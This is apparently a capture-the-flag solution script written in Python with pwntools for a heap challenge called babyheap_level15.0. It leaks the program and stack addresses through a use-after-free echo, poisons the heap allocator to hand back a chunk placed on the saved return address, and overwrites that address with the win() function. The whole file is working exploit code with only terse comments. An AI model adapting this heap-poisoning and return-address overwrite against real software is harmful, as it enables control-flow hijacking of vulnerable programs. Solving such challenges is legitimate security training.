# idea: malloc -> free -> echo -> get stack & main address leak
# malloc next to be ret addr -> win()

from pwn import *

p = process("/challenge/babyheap_level15.0")
#p = gdb.debug("/challenge/babyheap_level15.0")
binary = ELF("/challenge/babyheap_level15.0")

def malloc_to_1(loc:bytes):
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'80')
    p.sendline(b'malloc')
    p.sendline(b'2')
    p.sendline(b'80')
    p.sendline(b'free')
    p.sendline(b'2')
    p.sendline(b'free')
    p.sendline(b'1')

    p.sendline(b'read')
    p.sendline(b'0')
    p.sendline(b'113') # 96 + 8 + 8
    p.sendline(b'\x00' * 96 + loc + b'\x00'*7)
    p.sendline(b'malloc')
    p.sendline(b'2')
    p.sendline(b'80')
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'80')

def scanf_to_pos(buf:bytes, pos:bytes, size:bytes):
    p.sendline(b'read')
    p.sendline(pos)
    p.sendline(size)
    p.recv()
    p.sendline(buf)
    p.recv()

print(p.recv())
# leak main addr & stack addr
p.sendline(b'malloc')
p.sendline(b'0')
p.sendline(b'80')
p.sendline(b'malloc')
p.sendline(b'1')
p.sendline(b'80')
p.sendline(b'free')
p.sendline(b'1')
p.sendline(b'echo')
p.sendline(b'0')
p.sendline(b'96')
p.recvuntil(b'Data: ')

p.sendline(b'echo')
p.sendline(b'0')
p.sendline(b'192')
p.recvuntil(b'Data: ')
binary_leak = unpack(p.recvuntil(b'\n')[:-1], 'all')
binary_base = binary_leak - binary.sym['bin_echo']
print(f'binary_base = {hex(binary_base)}')
binary.address = binary_base
win_addr = binary.sym.win

p.sendline(b'echo')
p.sendline(b'0')
p.sendline(b'200')
p.recvuntil(b'Data: ')
stack_free_addr = unpack(p.recvuntil(b'\n')[:-1], 'all')
print(f'stack_free_addr = {hex(stack_free_addr)}')
ret_addr = stack_free_addr + 374

# malloc a chunk to ret_addr
malloc_to_1(p64(ret_addr))

# scanf win() to ret_addr
scanf_to_pos(p64(win_addr), b'1', b'9')

p.interactive()

